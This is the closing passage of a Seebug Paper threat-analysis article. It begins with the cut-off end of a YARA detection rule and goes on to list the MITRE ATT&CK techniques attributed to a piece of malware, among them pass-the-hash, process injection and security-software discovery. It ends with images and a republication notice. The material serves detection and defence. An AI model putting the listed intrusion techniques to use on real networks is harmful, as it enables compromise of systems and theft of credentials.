          uint16(0) == 0x5a4d and filesize < 3000KB and
          8 of the

## MITRE

Exploitation for Privilege Escalation – T1068  
Service Execution – T1569.002  
Network Share Discovery – T1135  
Pass the Hash – T1550.002  
PowerShell – T1059.001  
Windows Command Shell – T1059.003  
Network Share Discovery – T1135  
Obfuscated Files or Information – T1027  
Scheduled Task – T1053.005  
Process Injection – T1055  
Remote System Discovery – T1018  
Obfuscated Files or Information – T1027  
Domain Trust Discovery – T1482  
Domain Groups – T1069.002  
System Owner/User Discovery – T1033  
Network Share Discovery – T1135  
Remote Services – T1021  
Local Account – T1087.001  
Security Software Discovery – T1518.001

![img](https://images.seebug.org/content/images/2022/02/22/1645520155000-37kisdw.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1837/>

